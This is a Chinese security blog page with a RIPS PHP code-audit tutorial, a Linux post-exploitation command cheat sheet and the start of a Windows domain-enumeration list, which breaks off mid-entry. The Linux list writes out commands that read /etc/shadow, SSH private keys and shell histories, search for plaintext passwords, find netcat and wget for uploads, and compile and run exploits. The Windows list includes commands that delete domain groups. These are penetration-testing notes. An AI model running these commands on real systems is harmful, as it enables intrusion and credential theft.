<p>博主在代码审计过程中选择使用RIPS，它使用了静态分析技术，能够自动化地挖掘PHP源代码潜在的安全漏洞如XSS ，sql注入，敏感信息泄漏，文件包含等常见漏洞；也可以采用正则方式扫描代码发现漏洞；还能够采用自定义的语法扫描代码发现问题。渗透测试人员可以直接容易的审阅分析结果，而不用审阅整个程序代码。当然，最后去校验结果必须是我们自己去做的。</p>
<h2 id="0x01-安装与配置"><a href="#0x01-安装与配置" class="headerlink" title="0x01 安装与配置"></a>0x01 安装与配置</h2><p>rips官网：<a href="http://rips-scanner.sourceforge.net/" target="_blank" rel="noopener">http://rips-scanner.sourceforge.net/</a><br>我们下载最新版本的rips之后，将压缩包解压后放在本地网站根目录下，通过浏览器（最好是firefox，因为rips宣称只支持firefox）访问即可使用。</p>
<h2 id="0x02-主界面介绍"><a href="#0x02-主界面介绍" class="headerlink" title="0x02 主界面介绍"></a>0x02 主界面介绍</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips01.png" alt=""></p>
<ul>
<li>subdirs：如果勾选上这个选项，会扫描所有子目录，否则只扫描一级目录，缺省为勾选。</li>
<li>verbosity level：选择扫描结果的详细程度，缺省为1(建议就使用1)。</li>
<li>vuln type：选择需要扫描的漏洞类型。支持命令注入、代码执行、SQL注入等十余种漏洞类型，缺省为全部扫描。</li>
<li>code style：选择扫描结果的显示风格（支持9种语法高亮）。</li>
<li>/regex/：使用正则表达式过滤结果。</li>
<li>path/file： 要扫描的目录。</li>
<li>scan： 开始扫描。</li>
</ul>
<p>主界面就这些功能按键，我们接下来尝试一下。</p>
<h2 id="0x03-实践"><a href="#0x03-实践" class="headerlink" title="0x03 实践"></a>0x03 实践</h2><p>在路径处输入我搭建的各种渗透测试环境的网页根目录，然后点击scan，稍等一会就会出现全部结果，并以图表的方式弹出一个总结的结果页面。</p>
<p>我们可以发现，198个文件就报告了163个疑似漏洞的代码。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips02.png" alt=""></p>
<p>然后我们看这些报告</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips03.png" alt=""></p>
<p>点击每一个代码块左上角的书页小图标，就会展开这个代码的详情。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips04.png" alt=""></p>
<p>点击每一个代码块左上角的红色小图标，可以生成漏洞的利用代码。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips05.png" alt=""></p>
<p>将生成的php代码放在php文件里面传入参数就可以运行</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips06.png" alt=""></p>
<p>点击每一个代码块左上角的问号小图标，就会展开这个漏洞的详情、原理。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips07.png" alt=""></p>
<p>同样，问号中还有漏洞的解决方案和更安全的范例代码书写方法。</p>
<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/rips/rips08.png" alt=""></p>
<p>总是将期望的字符串嵌入到引号中，并在将其嵌入查询之前使用PHP构建函数将字符串转义。 </p>
<p>始终嵌入不带引号的预期整数，并在将数据嵌入查询之前将数据转换为整数。 </p>
<p>转义数据但嵌入不带引号并不安全。</p>
<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>方便使用的工具十分重要，但同时工具也只是帮我们更快速的筛选一遍有可能出现问题的地方，然后我们需要做的就是自己去审计，将真正有隐患的地方寻找出来并提出解决方案。</p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/08/内网渗透常用命令总结（linux）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/08/内网渗透常用命令总结（linux）/" itemprop="url">
                  内网渗透常用命令总结（linux）
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-08T21:34:32+08:00">
                2018-05-08
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/08/内网渗透常用命令总结（linux）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（linux）">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了windows系统在内网渗透和提权中的常用命令，这篇总结下linux在内网渗透中常用的命令。</p>
<h2 id="0x01-查看操作系统信息"><a href="#0x01-查看操作系统信息" class="headerlink" title="0x01 查看操作系统信息"></a>0x01 查看操作系统信息</h2><h4 id="操作系统版本"><a href="#操作系统版本" class="headerlink" title="操作系统版本"></a>操作系统版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release      # Debian </span><br><span class="line">cat /etc/redhat-release   # Redhat</span><br></pre></td></tr></table></figure>
<h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line">set</span><br></pre></td></tr></table></figure>
<h2 id="0x02-应用和服务"><a href="#0x02-应用和服务" class="headerlink" title="0x02 应用和服务"></a>0x02 应用和服务</h2><h4 id="正在运行的程序和权限"><a href="#正在运行的程序和权限" class="headerlink" title="正在运行的程序和权限"></a>正在运行的程序和权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br></pre></td></tr></table></figure>
<p>如果要查询root权限运行的进程，可以补充为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure></p>
<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archives</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure>
<h4 id="服务的配置文件"><a href="#服务的配置文件" class="headerlink" title="服务的配置文件"></a>服务的配置文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</span><br></pre></td></tr></table></figure>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
<h4 id="存储的明文用户名，密码"><a href="#存储的明文用户名，密码" class="headerlink" title="存储的明文用户名，密码"></a>存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</span><br></pre></td></tr></table></figure>
<h2 id="0x03-网络相关"><a href="#0x03-网络相关" class="headerlink" title="0x03 网络相关"></a>0x03 网络相关</h2><h4 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br></pre></td></tr></table></figure>
<h4 id="网络配置-DNS-DHCP-网关"><a href="#网络配置-DNS-DHCP-网关" class="headerlink" title="网络配置,DNS,DHCP,网关"></a>网络配置,DNS,DHCP,网关</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br></pre></td></tr></table></figure>
<h4 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
<h4 id="路由缓存"><a href="#路由缓存" class="headerlink" title="路由缓存"></a>路由缓存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">route -nee</span><br></pre></td></tr></table></figure>
<h2 id="0x04-用户相关"><a href="#0x04-用户相关" class="headerlink" title="0x04 用户相关"></a>0x04 用户相关</h2><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos;   # 列出超级用户</span><br><span class="line">awk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&apos; /etc/passwd   #列出超级用户</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<h4 id="列主目录"><a href="#列主目录" class="headerlink" title="列主目录"></a>列主目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br></pre></td></tr></table></figure>
<h4 id="其他用户的操作记录"><a href="#其他用户的操作记录" class="headerlink" title="其他用户的操作记录"></a>其他用户的操作记录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
<h4 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
<h2 id="0x05-文件系统相关"><a href="#0x05-文件系统相关" class="headerlink" title="0x05 文件系统相关"></a>0x05 文件系统相关</h2><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /var/log</span><br><span class="line">ls -alh /var/mail</span><br><span class="line">ls -alh /var/spool</span><br><span class="line">ls -alh /var/spool/lpd</span><br><span class="line">ls -alh /var/lib/pgsql</span><br><span class="line">ls -alh /var/lib/mysql</span><br><span class="line">cat /var/lib/dhcp3/dhclient.lea</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/log/apache2/access_log</span><br><span class="line">cat /var/log/apache2/access.log</span><br><span class="line">cat /var/log/apache2/error_log</span><br><span class="line">cat /var/log/apache2/error.log</span><br><span class="line">cat /var/log/apache/access_log</span><br><span class="line">cat /var/log/apache/access.log</span><br><span class="line">cat /var/log/auth.log</span><br><span class="line">cat /var/log/chttp.log</span><br><span class="line">cat /var/log/cups/error_log</span><br><span class="line">cat /var/log/dpkg.log</span><br><span class="line">cat /var/log/faillog</span><br><span class="line">cat /var/log/httpd/access_log</span><br><span class="line">cat /var/log/httpd/access.log</span><br><span class="line">cat /var/log/httpd/error_log</span><br><span class="line">cat /var/log/httpd/error.log</span><br><span class="line">cat /var/log/lastlog</span><br><span class="line">cat /var/log/lighttpd/access.log</span><br><span class="line">cat /var/log/lighttpd/error.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/log/messages</span><br><span class="line">cat /var/log/secure</span><br><span class="line">cat /var/log/syslog</span><br><span class="line">cat /var/log/wtmp</span><br><span class="line">cat /var/log/xferlog</span><br><span class="line">cat /var/log/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/log/postgresql/</span><br><span class="line">ls -alh /var/log/proftpd/</span><br><span class="line">ls -alh /var/log/samba/</span><br></pre></td></tr></table></figure>
<h4 id="网站文件"><a href="#网站文件" class="headerlink" title="网站文件"></a>网站文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -alhR /var/www/</span><br><span class="line">ls -alhR /srv/www/htdocs/</span><br><span class="line">ls -alhR /usr/local/www/apache22/data/</span><br><span class="line">ls -alhR /opt/lampp/htdocs/</span><br><span class="line">ls -alhR /var/www/html/</span><br></pre></td></tr></table></figure>
<h4 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br><span class="line">df -h</span><br><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
<h4 id="可写目录"><a href="#可写目录" class="headerlink" title="可写目录"></a>可写目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # 可写目录</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 </span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # 可写目录</span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录</span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</span><br></pre></td></tr></table></figure>
<h2 id="0x06-准备与攻击"><a href="#0x06-准备与攻击" class="headerlink" title="0x06 准备与攻击"></a>0x06 准备与攻击</h2><h4 id="语言支持"><a href="#语言支持" class="headerlink" title="语言支持"></a>语言支持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">find / -name cc</span><br></pre></td></tr></table></figure>
<h4 id="上传方式"><a href="#上传方式" class="headerlink" title="上传方式"></a>上传方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name wget</span><br><span class="line">find / -name nc*</span><br><span class="line">find / -name netcat*</span><br><span class="line">find / -name tftp*</span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure>
<h4 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h4><ul>
<li><a href="http://www.exploit-db.com" target="_blank" rel="noopener">http://www.exploit-db.com</a></li>
<li><a href="http://1337day.com" target="_blank" rel="noopener">http://1337day.com</a></li>
<li><a href="http://www.securiteam.com" target="_blank" rel="noopener">http://www.securiteam.com</a></li>
<li><a href="http://www.securityfocus.com" target="_blank" rel="noopener">http://www.securityfocus.com</a></li>
<li><a href="http://www.exploitsearch.net" target="_blank" rel="noopener">http://www.exploitsearch.net</a></li>
<li><a href="http://metasploit.com/modules/" target="_blank" rel="noopener">http://metasploit.com/modules/</a></li>
<li><a href="http://securityreason.com" target="_blank" rel="noopener">http://securityreason.com</a></li>
<li><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/</a></li>
<li><a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a></li>
</ul>
<h4 id="编译exp"><a href="#编译exp" class="headerlink" title="编译exp"></a>编译exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which gcc</span><br><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure>
<h4 id="运行exp"><a href="#运行exp" class="headerlink" title="运行exp"></a>运行exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/05/内网渗透常用命令总结（windows）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="麻薯">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Leticia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/05/内网渗透常用命令总结（windows）/" itemprop="url">
                  内网渗透常用命令总结（windows）
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-05T21:55:03+08:00">
                2018-05-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/笔记/" itemprop="url" rel="index">
                    <span itemprop="name">笔记</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          
             <span id="/2018/05/05/内网渗透常用命令总结（windows）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（windows）">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              

              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长</span>
                
                <span title="阅读时长">
                  
                </span>
              
            </div>
          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>对内网渗透这里很多知识技巧不了解，所以认真看了几天，顺便总结下windows内网渗透的常用命令。</p>
<h2 id="0x01-查看域信息"><a href="#0x01-查看域信息" class="headerlink" title="0x01 查看域信息"></a>0x01 查看域信息</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">net group /domain                        //获得所有域用户组列表 </span><br><span class="line">net group qq_group /domain               //显示域中qq_group组的成员 </span><br><span class="line">net group qq_group /del /domain          //删除域中qq_group组</span><br><span class="line">net group qq_group qq /del /domain       //删除域内qq_group 群组中的成员QQ</span><br><span class="line">net group qq_group /add /domain          //增加域中的群组</span><br><span class="line">net group &quot;domain admins&quot;  /domain       //获得域管理员列表</span><br><span class="line">net group &quot;enterprise admins&quot; /domain    //获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain    //获取域内置administrators组用（enterprise admins、domain admins）</span><br><span class="line">net group &quot;domain controllers&quot;  /domain   //获得域控制器列表</span><br><span class="line">net group &quot;domain computers&quot;  /domain    //获得所有域成员计算机列表</span><br><span class="line">net user /domain                        //获得所有域用户列表</span><br><span class="line">net user someuser /domain              //获得指定账户someuser的详细信息</span><br><span class="line">net accounts /domain                //获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">nei view /domain                   //查询有几个域, 